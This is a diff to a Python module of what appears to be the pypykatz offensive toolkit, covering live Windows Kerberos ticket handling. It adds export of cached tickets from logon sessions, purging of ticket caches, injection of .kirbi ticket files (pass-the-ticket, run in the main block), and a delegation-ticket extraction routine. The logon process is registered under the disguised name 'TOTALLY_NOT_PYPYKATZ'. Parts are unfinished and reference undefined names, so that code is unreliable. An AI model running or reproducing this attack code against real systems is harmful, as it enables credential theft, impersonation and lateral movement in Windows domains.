@@ -6,7 +6,9 @@ from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
 from minikerberos.security import APREPRoast
 from minikerberos.network.clientsocket import KerberosClientSocket
 from minikerberos.common.target import KerberosTarget
-from winsspi.sspi import KerberoastSSPI
+from winsspi.sspi import KerberoastSSPI, SSPI, SSPIModule, SSPIResult
+from winsspi.common.function_defs import SECPKG_CRED, ISC_REQ
+from winsspi.common.gssapi.asn1_structs  import InitialContextToken
 from winacl.functions.highlevel import get_logon_info
 
 
@@ -22,7 +24,8 @@ from minikerberos.common.utils import TGSTicket2hashcat
 from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ, KRB_CRED
 from minikerberos.common.utils import print_table
 from minikerberos.common.ccache import CCACHE, Credential
-from minikerberos.protocol.asn1_structs import KRBCRED
+from minikerberos.protocol.asn1_structs import KRBCRED, TGS_REP, Authenticator
+from minikerberos.protocol.structures import ChecksumFlags, AuthenticatorChecksum
 
 
 from pypykatz import logger
@@ -31,7 +34,7 @@ from pypykatz.kerberos.functiondefs.netsecapi import LsaConnectUntrusted, \
 	LsaLookupAuthenticationPackage, KERB_PURGE_TKT_CACHE_REQUEST, LsaCallAuthenticationPackage, \
 	LsaDeregisterLogonProcess, LsaRegisterLogonProcess, LsaEnumerateLogonSessions, \
 	LsaGetLogonSessionData, LsaFreeReturnBuffer, retrieve_tkt_helper, KERB_RETRIEVE_TKT_RESPONSE, \
-	get_lsa_error, get_ticket_cache_info_helper, extract_ticket
+	get_lsa_error, get_ticket_cache_info_helper, extract_ticket, submit_tkt_helper
 
 from pypykatz.kerberos.functiondefs.advapi32 import OpenProcessToken,  GetTokenInformation_tokenstatistics
 from pypykatz.kerberos.functiondefs.kernel32 import GetCurrentProcessId, OpenProcess, CloseHandle, MAXIMUM_ALLOWED
@@ -66,13 +69,10 @@ class KerberosLive:
 		pm.getsystem()
 		self.__lsa_handle = LsaRegisterLogonProcess('TOTALLY_NOT_PYPYKATZ')
 		pm.dropsystem()
-		print('1')
 		self.__lsa_handle_is_elevated = True
 		return self.__lsa_handle
 
 	def open_lsa_handle(self, luid, req_elevated = False):
-		print('luid %s' % luid)
-		print('elev %s' % req_elevated)
 		if req_elevated is True:
 			if self.__lsa_handle_is_elevated is True:
 				return self.__lsa_handle
@@ -95,25 +95,27 @@ class KerberosLive:
 
 		self.current_luid = new_luid
 
-	def get_ticket_from_cache(self, luid, targetname):
-		self.open_lsa_handle(0, req_elevated=True)
-		ticket_data = None
-		msg_req_ticket = retrieve_tkt_helper(targetname, logonid = luid)
-		ret_msg, ret_status, free_prt = LsaCallAuthenticationPackage(self.__lsa_handle, self.kerberos_package_id, msg_req_ticket)
-		
-		#print('ret_msg %s' % ret_msg)
-		#print('ret_status %s' % ret_status)
-		if ret_status != 0:
-			raise get_lsa_error(ret_status)
-		
-		if len(ret_msg) > 0:
-			resp = KERB_RETRIEVE_TKT_RESPONSE.from_buffer_copy(ret_msg)
-			ticket_data = resp.Ticket.get_data()
-			LsaFreeReturnBuffer(free_prt)
-
-		return ticket_data
+	#def get_ticket_from_cache(self, luid, targetname):
+	#	self.open_lsa_handle(0, req_elevated=True)
+	#	ticket_data = None
+	#	msg_req_ticket = retrieve_tkt_helper(targetname, logonid = luid)
+	#	ret_msg, ret_status, free_prt = LsaCallAuthenticationPackage(self.__lsa_handle, self.kerberos_package_id, msg_req_ticket)
+	#	
+	#	#print('ret_msg %s' % ret_msg)
+	#	#print('ret_status %s' % ret_status)
+	#	if ret_status != 0:
+	#		raise get_lsa_error(ret_status)
+	#	
+	#	if len(ret_msg) > 0:
+	#		resp = KERB_RETRIEVE_TKT_RESPONSE.from_buffer_copy(ret_msg)
+	#		ticket_data = resp.Ticket.get_data()
+	#		LsaFreeReturnBuffer(free_prt)
+	#
+	#	return ticket_data
 
 	def get_ticketinfo(self, luid):
+		if luid == 0:
+			luid = self.original_luid
 		self.open_lsa_handle(luid)
 		ticket_infos = {}
 		ticket_infos[luid] = []
@@ -134,14 +136,32 @@ class KerberosLive:
 
 		return ticket_infos
 
-	def get_all_ticketdata(self):
+	def export_ticketdata_target(self, luid, target):
+		self.open_lsa_handle(luid)
+		return extract_ticket(self.__lsa_handle, self.kerberos_package_id, luid, target)
+
+	def export_ticketdata(self, luid):
+		if luid == 0:
+			luid = self.original_luid
+		ticket_data = {}
+		if luid not in ticket_data:
+			ticket_data[luid] = []
+		
+		ticket_infos = self.get_all_ticketinfo()
+		for ticket in ticket_infos[luid]:
+			res = extract_ticket(self.__lsa_handle, self.kerberos_package_id, luid, ticket['ServerName'])
+			ticket_data[luid].append(res)
+		
+		return ticket_data
+
+	def export_all_ticketdata(self):
 		self.open_lsa_handle(0, req_elevated=True)
 		ticket_infos = self.get_all_ticketinfo()
 		ticket_data = {}
 		for luid in ticket_infos:
 			if luid not in ticket_data:
 				ticket_data[luid] = []
-			print(ticket_data)
+			
 			for ticket in ticket_infos[luid]:
 				res = extract_ticket(self.__lsa_handle, self.kerberos_package_id, luid, ticket['ServerName'])
 				ticket_data[luid].append(res)
@@ -168,11 +188,67 @@ class KerberosLive:
 				logger.debug('Failed to get info for LUID %s Reason: %s' % (luid, e ))
 				continue
 
-	def purge(self, luid):
+	def purge(self, luid = None):
+		luids = []
+		if luid is None:
+			self.open_lsa_handle(None, req_elevated=True)
+			luids += self.list_luids()
+		else:
+			luids.append(luid)
+			self.open_lsa_handle(luid)
+		
+		for luid_current in luids:
+			message = KERB_PURGE_TKT_CACHE_REQUEST(luid_current)
+			message_ret, status_ret, free_ptr = LsaCallAuthenticationPackage(self.__lsa_handle, self.kerberos_package_id, message)
+			if status_ret != 0:
+				raise get_lsa_error(status_ret)
+			if len(message_ret) > 0:
+				LsaFreeReturnBuffer(free_ptr)
+
+	def submit_ticket(self, ticket_data, luid = 0):
 		self.open_lsa_handle(luid)
-		message = KERB_PURGE_TKT_CACHE_REQUEST()
-		message_ret, status_ret, free_ptr = LsaCallAuthenticationPackage(self.__lsa_handle, self.kerberos_package_id, message)
-		LsaFreeReturnBuffer(free_ptr)
+		message = submit_tkt_helper(ticket_data, logonid=luid)
+		ret_msg, ret_status, free_ptr = LsaCallAuthenticationPackage(self.__lsa_handle, self.kerberos_package_id, message)
+		if ret_status != 0:
+			raise get_lsa_error(ret_status)
+
+		if len(ret_msg) > 0:
+			LsaFreeReturnBuffer(free_ptr)
+
+def get_tgt():
+	pass
+
+def get_tgs(target):
+	#target = ''
+	sspi = SSPI(SSPIModule.KERBEROS)
+	sspi._get_credentials(None, target, flags = SECPKG_CRED.BOTH)
+	res, data = sspi._init_ctx(target, flags = ISC_REQ.DELEGATE | ISC_REQ.MUTUAL_AUTH)
+	if res == SSPIResult.OK or res == SSPIResult.CONTINUE:
+		#key_data = sspi._get_session_key()
+		kl = KerberosLive()
+		raw_ticket = kl.export_ticketdata_target(0, target)
+		key = Key(raw_ticket['Key']['KeyType'], raw_ticket['Key']['Key'])
+		import pprint
+		token = InitialContextToken.load(data[0][1])
+		ticket = AP_REQ(token.native['innerContextToken']).native
+		
+		cipher = _enctype_table[ticket['authenticator']['etype']]
+		dec_authenticator = cipher.decrypt(key, 11, ticket['authenticator']['cipher'])
+		authenticator = Authenticator.load(dec_authenticator).native
+		if authenticator['cksum']['cksumtype'] != 0x8003:
+			raise Exception('Checksum not good :(')
+		
+		print(authenticator)
+		checksum_data = AuthenticatorChecksum.from_bytes(authenticator['cksum']['checksum'])
+		if ChecksumFlags.GSS_C_DELEG_FLAG not in checksum_data.flags:
+			raise Exception('delegation flag not set!')
+
+		print(authenticator['cksum']) #==0x8003
+		print(authenticator['authorization-data'][0]['ad-data'])
+		AS_REP.load()
+		#pprint.pprint(ticket['authenticator'])
+		
+	
 
 
 async def live_roast(outfile = None):
@@ -257,14 +333,28 @@ async def live_roast(outfile = None):
 
 
 if __name__ == '__main__':
-	kl = KerberosLive()
-	x = kl.get_all_ticketdata()
-	ctr = 0
-	for luid in x:
-		if x[luid] != []:
-			for ticket in x[luid]:
-				ctr += 1
-				with open('test_%s.kirbi' % ctr, 'wb') as f:
-					f.write(ticket['Ticket'])
+	import glob
+	import sys
 
+	kl = KerberosLive()
+	kl.purge(0)
+	#x = kl.get_all_ticketdata()
+	#ctr = 0
+	#for luid in x:
+	#	if x[luid] != []:
+	#		for ticket in x[luid]:
+	#			ctr += 1
+	#			with open('test_%s.kirbi' % ctr, 'wb') as f:
+	#				f.write(ticket['Ticket'])
+	#
 	#print(x)
+	#sys.exit()
+	for filename in glob.glob('*.kirbi'):
+		with open(filename, 'rb') as d:
+			ticket = d.read()
+			try:
+				kl.submit_ticket(ticket)
+				print('OK')
+			except Exception as e:
+				print(e)
+			input()
